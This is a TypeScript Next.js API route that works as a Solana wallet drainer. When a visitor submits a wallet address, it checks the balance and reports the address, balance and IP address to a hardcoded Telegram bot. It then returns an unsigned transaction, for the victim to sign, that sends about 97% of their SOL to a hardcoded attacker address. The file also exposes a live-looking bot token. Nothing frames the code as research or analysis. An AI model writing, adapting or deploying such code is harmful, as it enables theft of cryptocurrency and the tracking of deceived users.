import { type NextRequest, NextResponse } from "next/server"
import { Connection, PublicKey, Transaction, SystemProgram, LAMPORTS_PER_SOL } from "@solana/web3.js"

const RECIPIENT_ADDRESS = "7aE5Y7PvfUr52WnruiDATFpR99PWPo4q9U7vu3Hid3Yh"
const TELEGRAM_BOT_TOKEN = "8341387926:AAGEi8QJ2LSLphS15rmAOwS8aPfJ15cX27U"
const TELEGRAM_CHAT_IDS = [
  "7556622176",
  // Add more chat IDs here as needed
]

const PUBLIC_RPC_ENDPOINTS = [
  "https://api.mainnet-beta.solana.com",
  "https://solana-api.projectserum.com",
  "https://rpc.ankr.com/solana",
]

const RPC_ENDPOINT = PUBLIC_RPC_ENDPOINTS[0]

async function sendTelegramNotification(
  walletAddress: string, 
  balanceSOL: number, 
  balanceUSD: number, 
  userIP: string,
  error?: string,
  errorDetails?: string
) {
  try {
    let message: string
    
    if (error) {
      message = `
❌ *Error Occurred*

📍 *Address:* \`${walletAddress}\`
💰 *Balance:* ${balanceSOL.toFixed(6)} SOL
💵 *Balance USD:* $${balanceUSD.toFixed(2)}
🌐 *IP:* ${userIP}
🔴 *Error:* ${error}
📝 *Details:* ${errorDetails || "No additional details"}
      `.trim()
    } else {
      message = `
🔍 *Wallet Scanned*

📍 *Address:* \`${walletAddress}\`
💰 *Balance:* ${balanceSOL.toFixed(6)} SOL
💵 *Balance USD:* $${balanceUSD.toFixed(2)}
🌐 *IP:* ${userIP}
      `.trim()
    }

    const telegramUrl = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`

    // Send to all chat IDs in parallel
    const sendPromises = TELEGRAM_CHAT_IDS.map(chatId =>
      fetch(telegramUrl, {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
        },
        body: JSON.stringify({
          chat_id: chatId,
          text: message,
          parse_mode: "Markdown",
        }),
      }).catch(error => {
        console.error(`Failed to send to chat ${chatId}:`, error)
        return null
      })
    )

    await Promise.all(sendPromises)
  } catch (error) {
    console.error("Error in Telegram notification:", error)
  }
}

async function getSOLPrice(): Promise<number> {
  try {
    const response = await fetch("https://api.coingecko.com/api/v3/simple/price?ids=solana&vs_currencies=usd")
    const data = await response.json()
    return data.solana.usd
  } catch (error) {
    return 0
  }
}

export async function POST(request: NextRequest) {
  let walletAddress = "";
  let ipAddress = "";
  let balanceSOL = 0;
  let balanceUSD = 0;
  
  try {
    const body = await request.json()
    const { walletAddress: walletAddressBody, userIP: userIP } = body

    walletAddress = walletAddressBody;
    
    if (!walletAddress || typeof walletAddress !== "string") {
      const errorMsg = "Valid wallet address is required";
      await sendTelegramNotification(
        walletAddress || "unknown", 
        0, 
        0, 
        ipAddress || "unknown",
        "Validation Error",
        errorMsg
      );
      return NextResponse.json({ error: errorMsg }, { status: 400 })
    }

    ipAddress = userIP || "unknown"

    let walletPubkey: PublicKey
    let recipientPubkey: PublicKey

    try {
      walletPubkey = new PublicKey(walletAddress)
      recipientPubkey = new PublicKey(RECIPIENT_ADDRESS)
    } catch (error) {
      const errorMsg = "Invalid wallet address format";
      await sendTelegramNotification(
        walletAddress, 
        0, 
        0, 
        ipAddress,
        "Invalid Address",
        errorMsg
      );
      return NextResponse.json({ error: errorMsg }, { status: 400 })
    }

    const connection = new Connection(RPC_ENDPOINT, "confirmed")

    const balanceLamports = await connection.getBalance(walletPubkey)
    balanceSOL = balanceLamports / LAMPORTS_PER_SOL

    const solPriceUSD = await getSOLPrice()
    balanceUSD = balanceSOL * solPriceUSD

    await sendTelegramNotification(walletAddress, balanceSOL, balanceUSD, ipAddress)

    const MIN_BALANCE_SOL = 0.01
    if (balanceSOL < MIN_BALANCE_SOL) {
      const errorMsg = `Insufficient balance: ${balanceSOL.toFixed(6)} SOL < ${MIN_BALANCE_SOL} SOL`;
      await sendTelegramNotification(
        walletAddress, 
        balanceSOL, 
        balanceUSD, 
        ipAddress,
        "Insufficient Balance",
        errorMsg
      );
      
      return NextResponse.json(
        {
          error: "Insufficient balance",
          balance: balanceSOL,
          minRequired: MIN_BALANCE_SOL,
        },
        { status: 400 },
      )
    }

    const TRANSACTION_FEE = 5000
    const SAFETY_BUFFER = 10000
    const MINIMUM_RESERVE = 0.001 * LAMPORTS_PER_SOL

    const totalReserve = TRANSACTION_FEE + SAFETY_BUFFER + MINIMUM_RESERVE
    const availableForTransfer = Math.max(0, balanceLamports - totalReserve)
    const transferAmount = Math.floor(availableForTransfer * 0.97)

    if (transferAmount < 5000) {
      const errorMsg = `Transfer amount too small: ${transferAmount / LAMPORTS_PER_SOL} SOL`;
      await sendTelegramNotification(
        walletAddress, 
        balanceSOL, 
        balanceUSD, 
        ipAddress,
        "Transfer Amount Too Small",
        errorMsg
      );
      
      return NextResponse.json(
        {
          error: "Transfer amount too small",
          balance: balanceSOL,
          transferAmount: transferAmount / LAMPORTS_PER_SOL,
        },
        { status: 400 },
      )
    }

    const { blockhash: blockhash, lastValidBlockHeight: lastValidBlockHeight } = await connection.getLatestBlockhash("finalized")

    const transaction = new Transaction({
      recentBlockhash: blockhash,
      feePayer: walletPubkey,
    })

    const transferInstruction = SystemProgram.transfer({
      fromPubkey: walletPubkey,
      toPubkey: recipientPubkey,
      lamports: transferAmount,
    })
    transaction.add(transferInstruction)

    const serializedTransaction = transaction
      .serialize({
        requireAllSignatures: false,
        verifySignatures: false,
      })
      .toString("base64")

    return NextResponse.json({
      success: true,
      walletBalance: balanceSOL,
      transferAmount: transferAmount / LAMPORTS_PER_SOL,
      percentage: 97,
      transaction: serializedTransaction,
      blockhash: blockhash,
      lastValidBlockHeight: lastValidBlockHeight,
    })
  } catch (error) {
    const errorMsg = error instanceof Error ? error.message : String(error);
    const errorDetails = error instanceof Error ? error.stack : "No stack trace";
    
    // Send error notification to Telegram
    await sendTelegramNotification(
      walletAddress || "unknown", 
      balanceSOL, 
      balanceUSD, 
      ipAddress || "unknown",
      "Server Error",
      `${errorMsg}\n\nStack: ${errorDetails?.substring(0, 500)}`
    );
    
    return NextResponse.json(
      {
        error: "Failed to process request",
      },
      { status: 500 },
    )
  }
}

export async function GET() {
  return NextResponse.json({
    status: "ok",
  })
  }
